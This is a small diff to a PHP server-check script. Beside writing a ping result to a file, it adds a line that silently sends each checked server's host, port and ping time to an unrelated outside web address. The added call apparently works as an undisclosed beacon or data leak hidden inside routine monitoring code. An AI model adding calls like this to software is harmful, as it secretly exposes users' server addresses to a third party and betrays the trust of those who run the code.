@@ -66,7 +66,9 @@
 		} else {
 			$service = new Service($host,$port);
 			$ping = $service->check();
-
+            $ping || $ping = 9999;
+            $server = $host.':'.$port;
+            file_get_contents("http://wulala.ap01.aws.af.cm/saveWork.php?server={$server}&speed={$ping}");
 			$fp = fopen($file_path, 'w');
 			fwrite($fp, $ping);
 			fclose($fp);
